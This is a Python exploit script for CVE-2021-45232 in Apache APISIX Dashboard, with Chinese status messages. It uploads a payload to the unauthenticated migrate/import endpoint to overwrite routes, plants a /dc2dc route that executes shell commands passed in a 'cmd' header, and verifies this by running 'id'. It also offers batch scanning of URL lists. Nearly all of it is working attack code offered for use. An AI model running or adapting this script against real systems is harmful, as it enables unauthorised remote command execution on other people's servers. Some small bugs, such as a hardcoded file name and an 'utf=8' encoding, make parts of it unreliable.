import requests
import os
import optparse
from urllib.parse import urlparse
from multiprocessing import Pool


def exploit(url):
    geturl=urlparse(url)
    port=80
    importurl="{}/apisix/admin/migrate/import".format(url.rstrip("/"))
    url2="{}://{}:{}/dc2dc".format(geturl.scheme,geturl.hostname,port)

    try:
        r = requests.post(url=importurl, data={"mode": "overwrite"}, files={"file": open("apisixPayload", "rb")})
        if r.status_code==200:
            try:
                jsondata=r.json()
            except:
                print("[-] 不存在CVE-2021-45232漏洞 code:{} 非JSON返回包 url:{} code:{}".format(r.status_code,r.url,r.status_code))
                return 1

        else:
            print("[-] 不存在CVE-2021-45232漏洞 code:{} url:{}".format(r.status_code,url))

    except Exception as error:
        print("[-] Error:{} number:{}".format(error,error.__traceback__.tb_lineno))

    if r.status_code==200 and jsondata["code"]==0:
        print("[+] 路由创建成功:/dc2dc header:cmd=<command> url:{}".format(url))
        print("[*] apisix API端口探测(default:80)")
        try:
            execute=requests.post(url=url2,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36","cmd":"id"},timeout=3)
            if execute.status_code==200:
                print("[+] shell:{}".format(url2))
                print(execute.text)


        except requests.Timeout as timeout:
            print("[-] apisix API默认端口不是80请自行端口扫描，然后访问 url:{}".format(url))

        except Exception as error:
            print("[-] Error:{} number:{}".format(error,error.__traceback__.tb_lineno))


def main():
    if os.path.exists("apisixPayload"):
        parser=optparse.OptionParser()
        parser.add_option("-u",dest="url",help="目标url")
        parser.add_option("-f",dest="file",help="批量检测")
        (option,args)=parser.parse_args()
        if option.url:
            exploit(option.url)
        elif option.file:
            P=Pool(10)
            if os.path.exists(option.file):
                file=open("url.txt","r",encoding="utf=8")
                urllist=file.read().split("\n")
                for url_ in urllist:
                    P.apply_async(exploit,args=(url_,))
                P.close()
                P.join()

            else:
                print("[-] 指定文件不存在：{}".format(option.file))

        else:
            print("usage:python exploit.py -u <url> #单个url检测")
            print("usage:python exploit.py -f <file> #批量检测")
            parser.print_help()
    else:
        print("[-] payload文件不存在请生成")
        exit()
if __name__ == '__main__':
    main()